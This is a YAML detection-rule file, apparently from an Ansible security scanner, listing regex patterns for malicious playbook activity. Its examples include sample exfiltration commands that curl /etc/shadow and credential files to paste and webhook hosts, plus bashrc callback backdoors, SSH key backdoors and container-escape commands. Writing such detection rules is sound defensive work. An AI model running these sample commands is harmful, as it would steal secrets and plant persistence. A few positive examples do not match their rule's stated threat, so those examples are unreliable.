name: "Malicious Activity Patterns"
author: "Ansible Security Scanner Team"
description: "Detects patterns indicating credential harvesting, backdoor installation, data exfiltration, or other malicious activities"

patterns:
  # Specific command injection patterns (order matters - specific patterns first!)

  - id: "shell_command_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Shell Command Injection"
    description: >-
        /bin/{bash,sh,zsh,fish} -c receives a string interpolated from {{
        user_command }}. The payload is whatever the variable resolves to; this is
        the textbook command-injection sink.
    regex: "(?:/bin/(?:bash|sh|zsh|fish)).*-c.*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "/bin/bash-c{{user_command}}"
    recommendation: "{{ user_command }} into /bin/{ba,z,fi}sh -c is a direct CWE-78 sink; remove the task and audit the host. Legitimate user-driven actions should be validated against an allow-list and dispatched as argv to ansible.builtin.command (no shell)."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "powershell_command_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "PowerShell Command Injection"
    description: >-
        powershell.exe / pwsh.exe -Command (or -ExecutionPolicy Bypass) receives a
        string interpolated from {{ user_command }}. PowerShell with bypassed
        execution policy runs anything the variable resolves to.
    regex: "(?:powershell\\.exe|pwsh\\.exe).*(?:-Command|-ExecutionPolicy.*Bypass).*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "powershell.exe-Command{{user_command}}"
    recommendation: "powershell.exe -Command {{ user_command }} (especially with -ExecutionPolicy Bypass) is direct code execution; remove the task and audit the host. Drive Windows operations via parameterised modules (ansible.windows.win_service, win_user, win_regedit) instead of inline PowerShell."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "windows_cmd_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Windows CMD Command Injection"
    description: >-
        cmd.exe /c or /k receives a string interpolated from {{ user_command }}. cmd
        metacharacters in the variable yield trivial command injection on Windows
        targets.
    regex: "cmd\\.exe.*/[ck].*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "cmd.exe/c{{user_command}}"
    recommendation: "cmd.exe /c {{ user_command }} is direct code execution; remove the task and audit the host. Replace with ansible.windows.win_command (argv form) or a purpose-built module."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "adb_command_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Android ADB Command Injection"
    description: >-
        adb shell receives a string interpolated from {{ user_command }}. An
        attacker-controlled command string runs on every connected Android device
        with debugging enabled.
    regex: "adb\\s+shell\\s+.*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "adb shell {{user_command}}"
    recommendation: "adb shell {{ user_command }} executes attacker-supplied code on the device; remove the task. Device automation should drive a controller-vetted wrapper that validates the requested action against an allow-list before calling adb."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "systemd_command_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Systemd Command Injection"
    description: >-
        systemd-run --scope --user receives a string interpolated from {{
        user_command }}. systemd scopes inherit the invoking user's privileges and
        run whatever the variable resolves to.
    regex: "systemd-run.*--scope.*--user.*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "systemd-run--scope--user{{user_command}}"
    recommendation: "systemd-run --scope --user {{ user_command }} delegates execution to a system service manager with attacker bytes; remove the task and audit. Use ansible.builtin.systemd_service with a static unit file rather than ad-hoc transient units."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "container_command_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Container Command Injection"
    description: >-
        Container `command:` array contains a {{ user_command }} entry. The
        container's entrypoint runs the user-controlled string with the container's
        full capabilities.
    # `"command": [ ... ]` list in a K8s/container spec can be authored with
    # the variable on a different line from the opening bracket.
    regex: "\"command\":\\s*\\[[\\s\\S]{0,200}?\\{\\{[^}]*user_command[^}]*\\}\\}"
    positive_examples:
      - '"command":[{{user_command}}'
    multiline: true
    window: 10
    recommendation: "Templating {{ user_command }} into a container's command: array gives the caller code execution inside the container; replace with a static command + args list and pass user-controlled values as environment variables that the container process validates."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "network_command_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Network Command Injection"
    description: >-
        ssh/lftp/sftp invocation interpolates {{ user_command }} into the remote
        command. The injected payload runs on the remote host, not the controller.
    regex: "(?:ssh|lftp|sftp).*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "ssh{{user_command}}"
    recommendation: "ssh/lftp/sftp ... {{ user_command }} runs attacker bytes on the remote host; remove the task and audit both ends. If remote execution is needed, declare the target with the appropriate Ansible connection plugin and call ansible.builtin.command - never compose a remote shell line by string."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "scheduled_task_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Scheduled Task Command Injection"
    description: >-
        schtasks /create /tr ... receives a {{ user_command }} value as the task
        action. The action runs with the scheduling user's privileges every time the
        task fires.
    regex: "schtasks.*/create.*/tr.*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "schtasks/create/tr{{user_command}}"
    recommendation: "schtasks /create /tr {{ user_command }} schedules attacker-supplied code as the running user; remove the task and audit Task Scheduler. Use community.windows.win_scheduled_task with explicit, static action arguments."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "wmic_command_injection"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "WMIC Command Injection"
    description: >-
        wmic process call create receives a {{ user_command }} argument. WMIC
        executes the string in the SYSTEM context on the target.
    regex: "wmic.*process.*call.*create.*\\{\\{.*user_command.*\\}\\}"
    positive_examples:
      - "wmicprocesscallcreate{{user_command}}"
    recommendation: "wmic process call create {{ user_command }} executes the rendered string with the privileges of the WMI caller; remove the task and audit the host. Use ansible.windows.win_command for argv-style execution instead."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "data_exfiltration_curl"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "curl Uploads Local File to External Endpoint (data-exfil primitive)"
    description: "A ``shell``/``command`` task runs ``curl`` with a file-upload flag (``-T /path`` / ``-F 'file=@/path'`` / ``-F 'upload=@/path'`` / ``--data-binary @/path`` / ``--upload-file /path``) targeting an ANONYMOUS paste-or-upload service (``transfer.sh``, ``file.io``, ``0x0.st``, ``x0.at``, ``bashupload.com``, ``oshi.at``, ``catbox.moe``, ``litterbox.catbox.moe``, ``ix.io``, ``dpaste.com``, ``pastebin.com``, ``paste.ee``, ``hastebin.com``, ``termbin.com``, ``requestbin.net``, ``webhook.site``, ``beeceptor.com``, ``ngrok.io``, ``burpcollaborator.net``, ``interact.sh``). These are the canonical data-exfiltration landing pads in IR write-ups (MITRE T1567.002 - Exfiltration to Cloud Storage). Rule previously matched the keyword ``evil``/``attacker`` in curl URLs which produced zero TPs and every FP in the corpus came from Splunk-SOAR playbook ``description`` fields containing the word ``attacker``."
    # Sub-shape A: curl file-upload flags targeting a known
    # anonymous-paste host. This is the real exfil primitive.
    # Sub-shape B: `curl ... https://<paste-host>/` without a local-
    # file flag still looks exfil-adjacent (command substitution
    # piping stdin) - include it but narrow the host list.
    regex: "\\bcurl\\s+[^\\n]*?(?:-T\\s|--upload-file\\s|--data-binary\\s+['\\\"]?@|-F\\s+['\\\"]?[A-Za-z_][A-Za-z0-9_]*\\s*=\\s*@)[^\\n]*?https?://(?:[^\\s/'\\\"]*\\.)?(?:transfer\\.sh|file\\.io|0x0\\.st|x0\\.at|bashupload\\.com|oshi\\.at|catbox\\.moe|litterbox\\.catbox\\.moe|ix\\.io|dpaste\\.com|pastebin\\.com|paste\\.ee|hastebin\\.com|termbin\\.com|requestbin\\.net|webhook\\.site|beeceptor\\.com|ngrok\\.io|burpcollaborator\\.net|interact\\.sh)\\b|\\bcurl\\s+[^\\n]*?https?://(?:[^\\s/'\\\"]*\\.)?(?:transfer\\.sh|0x0\\.st|x0\\.at|bashupload\\.com|oshi\\.at|catbox\\.moe|termbin\\.com|burpcollaborator\\.net|interact\\.sh)\\b"
    recommendation: "Exfiltration to paste-sites is a known post-compromise primitive; Ansible should never need it. If the task is a legitimate diagnostic dump (e.g. collecting a bug report), upload to YOUR org's object store over authenticated IAM (``amazon.aws.s3_object``, ``google.cloud.gcp_storage_object``) instead. Block these hosts at the egress firewall and alert on any curl PUT/POST to them from managed nodes."
    positive_examples:
      - "    shell: curl -T /etc/shadow https://transfer.sh/"
      - "    shell: curl -F 'file=@/var/log/auth.log' https://0x0.st"
      - "    shell: curl --data-binary @/tmp/creds.json https://webhook.site/abcd"
      - "    command: curl -T dump.tar.gz https://bashupload.com/"
      - "    shell: cat /etc/hosts | curl -F 'f=@-' https://catbox.moe/user/api.php"
    negative_examples:
      - "    shell: curl -d '{\"description\": \"attackers often use phishing\"}' https://splunk-soar/rest"
      - "    shell: curl -d @payload.json https://api.internal.corp/v1/alerts"
      - "    shell: curl -F 'file=@build.tar' https://artifacts.internal.corp/upload"
      - "    shell: curl -T release.tgz https://nexus.corp/repository/"
    cwe: ["CWE-200", "CWE-319"]
    mitre_attack: ["T1048", "T1567", "T1567.002"]
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "credential_file_upload"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Credential File Upload"
    description: >-
        curl -F file=@... uploads a 'credentials' path to a remote endpoint. The
        shape stages credentials for exfiltration via a multipart POST.
    regex: "curl.*-F.*file=@.*credentials"
    positive_examples:
      - "curl-Ffile=@credentials"
    recommendation: "curl -F file=@.../credentials uploads a credential file to a remote endpoint; remove the task, rotate any uploaded credentials, and audit egress logs for the destination."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "backdoor_bashrc"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Backdoor in Bashrc"
    description: >-
        echo '... curl evil.com ...' >> ~/.bashrc plants a callback that fires every
        time the user opens a shell. A classic low-tech persistence and beaconing
        pattern.
    regex: "echo.*curl.*evil\\.com.*>>.*\\.bashrc"
    positive_examples:
      - "echocurlevil.com>>.bashrc"
    recommendation: "Appending curl http://evil.com to ~/.bashrc plants a per-shell backdoor; remove the task, audit ~/.bashrc / ~/.bash_profile / ~/.profile / ~/.zshrc on all affected hosts, and rotate any credentials reachable from the user's shell environment."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "ssh_key_backdoor"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "SSH Key Backdoor"
    description: >-
        ssh-keygen names a 'backdoor' key, or authorized_keys is appended to with a
        'backdoor' label. Either shape installs an attacker-controlled SSH
        credential for persistence.
    regex: "ssh-keygen.*backdoor|authorized_keys.*backdoor"
    positive_examples:
      - "ssh-keygenbackdoor"
    recommendation: "ssh-keygen / authorized_keys writes named with 'backdoor' indicate persistent access provisioning; remove the task, audit ~/.ssh/authorized_keys on every account, and re-provision SSH access via ansible.posix.authorized_key sourced from an inventory-managed allow-list."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "credential_harvesting_env"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Credential Harvesting from Environment"
    description: >-
        echo $MASTER_PASSWORD / AWS_ACCESS_KEY / GITHUB_TOKEN / DOCKER_TOKEN
        appended to ~/.bashrc, .bash_profile, .zshrc, or .zprofile. The shape
        exfiltrates env-resident secrets to a user-readable file.
    regex: "echo.*(?:MASTER_PASSWORD|AWS_ACCESS_KEY|GITHUB_TOKEN|DOCKER_TOKEN).*>>.*\\.(bashrc|bash_profile|zshrc|zprofile)"
    positive_examples:
      - "echoMASTER_PASSWORD>>.bashrc"
    recommendation: "Echoing MASTER_PASSWORD / AWS_ACCESS_KEY / GITHUB_TOKEN / DOCKER_TOKEN into shell rc files persists secrets in user-readable plaintext; remove the task, rotate every captured credential, and source secrets from a secrets manager (Vault, AWS SM, GCP SM) at runtime instead."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "system_file_permissions"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Dangerous File Permissions"
    description: >-
        chmod 666 / 777 targets ~/.bashrc, ~/.ssh, ~/.aws, or ~/.docker.
        World-writable config files let any local user inject commands into the next
        shell or auth lookup.
    regex: "chmod\\s+(?:666|777).*\\.(bashrc|ssh|aws|docker)"
    positive_examples:
      - "chmod 666.bashrc"
    recommendation: "chmod 666/777 on .bashrc, .ssh, .aws, .docker enables tampering by any local user; reset the affected paths to mode 0600 (files) / 0700 (directories) with the correct owner, and audit recent modifications for tampering."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "docker_privileged_host"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Privileged Container with Host Access"
    description: >-
        docker run --privileged combined with --pid=host or --net=host. The
        container shares the host's PID/network namespace with no capability
        filtering - effectively root on the host.
    regex: "docker\\s+run.*--privileged.*--(?:pid|net)=host"
    positive_examples:
      - "docker run--privileged--pid=host"
    recommendation: "--privileged combined with --pid=host or --net=host effectively grants the container root on the node; replace with the minimum --cap-add= the workload needs, drop the rest, and use a user-defined network and PID namespace."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "container_root_mount"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Container Root Filesystem Mount"
    description: >-
        docker run -v /:/<path>:rw or -v /:/rootfs mounts the host root filesystem
        into the container. The container can edit /etc/sudoers, /etc/passwd, or any
        path on the host.
    regex: "docker\\s+run.*-v\\s+/:/.*:rw|docker\\s+run.*-v\\s+/:/rootfs"
    positive_examples:
      - "docker run-v /:/:rw"
    recommendation: "Bind-mounting the host's / (read-write) into a container is a trivial container-escape primitive; remove the mount, scope volumes to the specific directories the workload requires, and mount them read-only where possible."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "container_breakout"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Container Breakout Attempt"
    description: >-
        chroot /rootfs is invoked - the canonical second step after mounting the
        host root into a container. The shape escapes the container's filesystem
        isolation.
    regex: "chroot\\s+/rootfs"
    positive_examples:
      - "chroot /rootfs"
    recommendation: "chroot /rootfs (typically combined with /var/run/docker.sock or a privileged container) is a textbook container escape; remove the task, audit the affected node, and revoke the credentials of any account that scheduled the workload."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "kubernetes_privileged_pod"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Privileged Kubernetes Pod"
    description: >-
        Pod manifest sets hostNetwork: true, hostPID: true, or privileged: true.
        Each individually grants the pod near-host capabilities; combined, they make
        the pod equivalent to root on the node.
    regex: "hostNetwork.*true|hostPID.*true|privileged.*true"
    positive_examples:
      - "hostNetwork: true"
    recommendation: "hostNetwork: true / hostPID: true / privileged: true bypass Pod isolation; drop these settings, set the pod's securityContext to runAsNonRoot: true and allowPrivilegeEscalation: false, and admit only via a Pod Security Standard of 'restricted'."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']
    stig: ['V-254800']

  - id: "database_credential_exposure"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Database Credential Exposure"
    description: >-
        mysql/PGPASSWORD/sqlplus/sqlcmd/cqlsh invocation embeds -p with a literal or
        templated value on argv. The credential appears in /proc/<pid>/cmdline
        regardless of no_log.
    regex: "(?:mysql|PGPASSWORD|sqlplus|sqlcmd|cqlsh).*-p.*\\{\\{.*\\}\\}|(?:mysql|psql).*-p[\"'][^\"']*[\"']"
    positive_examples:
      - "_suse_php_common: [\"php{{ _suse_php_v }}-mysql\", \"php{{ _suse_php_v }}-openssl\", \"php{{ _suse_php_v }}-pgsql\", \"php{{ _suse_php_v }}-xmlreader\", \"php{{ _suse_php_v }}-xmlwriter\"]"
    recommendation: "Database CLIs receiving credentials via -p / -W on argv leak them through /proc; pass credentials via env (PGPASSWORD), .my.cnf (mode 0600), or - preferred - the community.{mysql,postgresql,mongodb} modules with login_* parameters loaded from Ansible Vault."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "ci_cd_pipeline_injection"
    category: "malicious_activity"
    severity: "HIGH"
    title: "CI/CD Pipeline Injection"
    description: >-
        curl POSTs to jenkins/gitlab/github build, pipeline, or dispatches endpoints
        with attacker-controllable variables. The shape injects work into a CI
        system that runs with high-trust credentials.
    regex: "curl.*(?:jenkins|gitlab|github).*(?:build|pipeline|dispatches).*(?:COMMAND|variables|command)"
    positive_examples:
      - "curljenkinsbuildCOMMAND"
    recommendation: "curl into Jenkins/GitLab/GitHub build endpoints with attacker-controlled COMMAND / variables fields enables arbitrary pipeline execution; route all pipeline triggers through the platform's signed-webhook + HMAC verification flow, and never expose the trigger token in playbook source."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "system_information_gathering"
    category: "malicious_activity"
    severity: "MEDIUM"
    title: "System Information Gathering"
    description: >-
        find -name -exec, ps aux | grep, netstat | grep, or env | grep filtered
        against SECRET/PASSWORD/TOKEN. The combination is the post-exploitation
        reconnaissance shape.
    regex: "(?:find.*-name.*-exec.*\\{\\}|ps\\s+aux.*grep|netstat.*grep|env.*grep.*(?:SECRET|PASSWORD|TOKEN))"
    positive_examples:
      - "find . -name \"Dockerfile*\" -exec echo \"=== {} ===\" \\; -exec grep -i \"conmon\\|runc\\|crun\" {} \\; 2>/dev/null || echo \"No Dockerfiles with runtime info\""
    recommendation: "find -exec / ps aux | grep / netstat | grep / env | grep SECRET|PASSWORD|TOKEN is reconnaissance; remove the task. Legitimate inventory should be collected via ansible.builtin.setup or a purpose-built fact module, not ad-hoc shell pipelines that grep for secrets."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "monitoring_system_compromise"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Monitoring System Compromise"
    description: >-
        curl targets elasticsearch _security/users, grafana admin users, or splunk
        authentication users. Compromising the monitoring tier disables the audit
        trail attackers want to evade.
    regex: "curl.*(?:elasticsearch.*_security|grafana.*admin|splunk.*authentication).*users"
    positive_examples:
      - "curlelasticsearch_securityusers"
    recommendation: "Calling Elasticsearch _security / Grafana admin / Splunk authentication endpoints from a playbook is suspicious unless the play is purpose-built for platform admin; if not, remove the task, rotate the API keys reachable on the host, and audit the platform's audit log for the originating IP."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "cloud_credential_exposure"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Cloud Credential Exposure"
    description: >-
        export AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY /
        GOOGLE_APPLICATION_CREDENTIALS=... resolves a {{ }} expression. The shape
        leaks cloud credentials into the shell environment of subsequent commands.
    regex: "export.*(?:AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|GOOGLE_APPLICATION_CREDENTIALS)=.*\\{\\{.*\\}\\}"
    positive_examples:
      - "export AWS_ACCESS_KEY_ID={{aws_access_key}}"
    recommendation: "export AWS_ACCESS_KEY_ID=... / AWS_SECRET_ACCESS_KEY=... / GOOGLE_APPLICATION_CREDENTIALS=... = {{ var }} in a shell task leaks the credential to /proc and shell history; pass cloud credentials via the cloud module's auth parameters (amazon.aws.aws_caller_info, google.cloud.gcp_*) loaded from Ansible Vault, or use IAM roles / Workload Identity instead of static keys."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "enterprise_service_exploitation"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Enterprise Service Exploitation"
    description: >-
        curl to Okta or Auth0 with `Authorization: SSWS|Bearer {{ ... }}`. The shape
        exercises identity-provider APIs with playbook-resident bearer tokens.
    regex: "curl.*(?:okta|auth0).*Authorization:.*(?:SSWS|Bearer).*\\{\\{.*\\}\\}"
    positive_examples:
      - "curloktaAuthorization:SSWS{{}}"
    recommendation: "curl ... okta|auth0 ... Authorization: SSWS|Bearer {{ var }} indicates direct API access against an identity provider; if this is intentional administrative automation, route through the vendor's Ansible collection (community.okta, community.general.auth0) with credentials in Vault and IP allow-list enforcement at the IdP."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "network_enumeration"
    category: "malicious_activity"
    severity: "MEDIUM"
    title: "Network Enumeration"
    description: >-
        nmap -sS -O or masscan --rate is invoked with {{ }} arguments. Active port
        scanning from inside the network is the canonical lateral-movement preamble.
    regex: "(?:nmap.*-sS.*-O|masscan.*--rate).*\\{\\{.*\\}\\}"
    positive_examples:
      - "nmap-sS-O{{}}"
    recommendation: "nmap -sS -O / masscan --rate of attacker-controlled targets is reconnaissance; if discovery is genuinely required, drive it from a sanctioned scanner (Nessus, Tenable, Qualys) whose scope is reviewed by a security team, not from ad-hoc playbook commands."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "advanced_data_harvesting"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Advanced Data Harvesting"
    description: >-
        for-loop iterates over /etc/passwd and /etc/shadow as config_file values.
        Reading shadow requires root and is the shape used to stage offline password
        cracking.
    regex: "for.*config_file.*in.*/etc/passwd.*/etc/shadow"
    positive_examples:
      - "forconfig_filein/etc/passwd/etc/shadow"
    recommendation: "Iterating across /etc/passwd / /etc/shadow harvests credential databases; remove the task and audit. /etc/shadow content should never leave the host - if password policy auditing is required, run it locally with a dedicated tool (pwquality, pam_pwquality) and ship only the resulting verdict."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "systemd_exploitation"
    category: "malicious_activity"
    severity: "MEDIUM"
    title: "Systemd Service Exploitation"
    description: >-
        systemd-run --scope --user receives a {{ }} expression. User-scoped systemd
        units inherit the invoker's session and are a quiet way to run code on
        managed hosts.
    regex: "systemd-run.*--scope.*--user.*\\{\\{.*\\}\\}"
    positive_examples:
      - "systemd-run--scope--user{{}}"
    recommendation: "systemd-run --scope --user {{ var }} schedules attacker-supplied bytes as a transient unit; remove the task and audit. Use ansible.builtin.systemd_service with a static unit file under /etc/systemd/system/ for any legitimate work."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "credential_dump_creation"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Credential Dump Creation"
    description: >-
        cat heredoc writes a 'credential' file at a templated path. The shape stages
        a multi-credential dump for later exfiltration.
    regex: "cat.*>.*\\{\\{.*\\}\\}.*credential.*<<.*EOF"
    positive_examples:
      - "cat>{{}}credential<<EOF"
    recommendation: "Heredoc-based bulk writes to a 'credential' file are credential staging; remove the task, audit the destination path for prior dumps, and rotate every credential reachable from the host."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "data_archiving_exfiltration"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Data Archiving for Exfiltration"
    description: >-
        tar -czf {{ ... }}.tar.gz packages a templated source path into a single
        archive. Archives are the standard staging shape before egress.
    regex: "tar.*-czf.*\\{\\{.*\\}\\}.*\\.tar\\.gz"
    positive_examples:
      - "tar-czf{{}}.tar.gz"
    recommendation: "tar -czf {{ var }}.tar.gz immediately preceding an outbound transfer is a stage-and-exfil primitive; if a backup is intended, use a sanctioned backup tool (restic, borg) with an off-host repository, encryption, and access logging, rather than an ad-hoc tar pipeline."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "file_permission_tampering"
    category: "malicious_activity"
    severity: "MEDIUM"
    title: "File Permission Tampering"
    description: >-
        chmod 666 against a {{ ... }} path opens a templated file to world-writable.
        The shape disables filesystem isolation to land follow-on writes.
    regex: "chmod.*666.*\\{\\{.*\\}\\}"
    positive_examples:
      - "chmod666{{}}"
    recommendation: "chmod 666 {{ path }} grants global write to whatever the variable resolves to; remove the chmod, set explicit modes (0640 files, 0750 dirs) via ansible.builtin.file with concrete paths, and audit the affected files for tampering."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "multi_platform_exploitation"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Multi-Platform Exploitation"
    description: >-
        powershell.exe -ExecutionPolicy Bypass or cmd.exe /c|/k with a {{ }}
        expression. The dual-shape signals a payload designed to run across both
        Windows shell stacks.
    regex: "powershell\\.exe.*-ExecutionPolicy.*Bypass|cmd\\.exe.*/[ck].*\\{\\{.*\\}\\}"
    positive_examples:
      - "win_command: cmd.exe /c mklink /d \"{{ remote_tmp_dir }}\\link-test\\link\" \"{{ remote_tmp_dir }}\\link-test\\link-target\""
    recommendation: "powershell -ExecutionPolicy Bypass and cmd /c {{ var }} together are cross-platform code execution primitives; remove the tasks and audit. Drive Windows operations via parameterised modules (ansible.windows.*) instead."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "registry_manipulation"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Windows Registry Manipulation"
    description: >-
        reg.exe add HKLM\... with the value containing 'password', 'secret', 'key',
        or 'token'. The shape persists secret data in system-wide Windows registry
        hives.
    regex: "reg\\.exe.*add.*HKLM.*(?:password|secret|key|token)"
    positive_examples:
      - "reg.exeaddHKLMpassword"
    recommendation: "reg.exe add HKLM ... password|secret|key|token writes a credential into the machine-wide registry hive in cleartext; remove the task, delete the key, and rotate the value into Windows Credential Manager (DPAPI) or an HSM-backed secrets store."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "mobile_platform_exploitation"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Mobile Platform Exploitation"
    description: >-
        adb shell `su -c` or `mount -o remount,rw /system`. The shape remounts the
        Android system partition writable from a playbook-driven exploit chain.
    regex: "adb.*shell.*(?:su.*-c|mount.*-o.*remount.*rw.*/system)"
    positive_examples:
      - "adbshellsu-c"
    recommendation: "adb shell su -c / mount -o remount,rw /system rewrites the device's system partition; remove the task. Legitimate mobile management should drive an MDM (Intune, Jamf, AirWatch) rather than ad-hoc adb commands against unrooted devices."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "persistence_mechanism"
    category: "malicious_activity"
    severity: "HIGH"
    title: "Persistence Mechanism Installation"
    description: >-
        cat heredoc writes a LaunchDaemons .plist, or schtasks /create with a
        templated /tr action. Both shapes install persistence that survives reboot
        and respawns the payload.
    regex: "(?:cat.*>.*LaunchDaemons.*\\.plist|schtasks.*/create.*/tr.*\\{\\{.*\\}\\})"
    positive_examples:
      - "cat>LaunchDaemons.plist"
    recommendation: "Writing LaunchDaemons plist files / schtasks /create are persistence techniques (MITRE T1547); remove the task, enumerate existing persistence on every affected host (osquery, autoruns), and provision legitimate services via ansible.builtin.systemd_service / community.windows.win_scheduled_task with static configuration."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
    pci_dss: ['10.4.1', '12.10.1']
    soc2: ['CC7.3']

  - id: "database_backdoor_user_creation"
    category: "malicious_activity"
    severity: "CRITICAL"
    title: "Database Backdoor User Creation"
    description: "Creating database users with hardcoded passwords and excessive privileges"
    regex: "(?:CREATE USER|createuser).*(?:WITH PASSWORD|IDENTIFIED BY|--pwprompt).*['\"][^'\"]{6,}['\"].*(?:CREATEDB|SUPERUSER|CREATEROLE|REPLICATION|ALL PRIVILEGES)"
    positive_examples:
      - "CREATE USERWITH PASSWORD'xxxxxx'CREATEDB"
    recommendation: "CREATE USER ... WITH PASSWORD '...' SUPERUSER / ALL PRIVILEGES creates a privileged backdoor account; remove it, audit the database for unauthorised logins, and provision real users via the database module (community.postgresql.postgresql_user, community.mysql.mysql_user) with role-based scoped grants and credentials in Vault."
    nist_controls: ['AU-6', 'IR-4', 'SI-4']
